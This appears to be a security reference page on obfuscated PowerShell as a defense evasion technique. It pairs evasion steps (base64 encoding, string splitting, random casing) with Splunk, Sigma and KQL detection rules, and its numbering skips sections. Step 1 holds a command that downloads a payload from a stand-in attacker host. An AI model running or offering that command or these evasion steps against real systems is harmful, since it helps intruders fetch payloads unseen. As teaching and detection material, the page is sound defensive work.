Obfuscated PowerShell Attack
- A defense evasion technique where attackers obfuscate PowerShell commands to avoid detection by security tools.

==================================================
1. Overview
==================================================
PowerShell is a powerful scripting language widely used in Windows environments.

Attackers frequently use PowerShell for:

- command execution
- payload delivery
- lateral movement

To evade detection, attackers obfuscate PowerShell commands using:

- encoding
- string manipulation
- variable substitution
- command splitting

This makes malicious activity harder to detect by:

- antivirus
- EDR
- signature-based tools


==================================================
2. Attack Scenario
==================================================
An attacker gains access to a system.

Instead of executing a visible command, the attacker encodes the payload.

The encoded command is executed via PowerShell.

Security tools fail to detect the malicious intent.


==================================================

==================================================
5. Step-by-Step Execution
==================================================
Step 1 — Create Payload

Example:

powershell -nop -c "Invoke-WebRequest http://attacker/payload.ps1"


Step 2 — Encode Command

Example:

powershell -EncodedCommand <base64_string>


Step 3 — Obfuscate Further

Examples:

- string concatenation
- variable substitution
- random casing


Step 4 — Execute Command

The system executes obfuscated PowerShell without triggering alerts.


==================================================
6. Common Obfuscation Techniques
==================================================

Base64 Encoding

EncodedCommand parameter.


String Splitting

"Inv"+"oke-WebRequest"


Variable Substitution

$var="Invoke-WebRequest"


Character Encoding

Unicode or ASCII encoding.


Randomization

Mixed casing and spacing.

14. SOC Detection Queries
==================================================

Splunk Query (Encoded PowerShell)

index=windows
| search powershell AND "-enc"


Splunk Query (Long Base64 Strings)

index=windows
| regex command_line=".{100,}"


Sigma Rule Example

title: Suspicious Encoded PowerShell
logsource:
  product: windows
detection:
  selection:
    CommandLine: "*-enc*"
  condition: selection
level: high


Microsoft Sentinel (KQL) Example

SecurityEvent
| where Process has "powershell"
| where CommandLine contains "-enc"
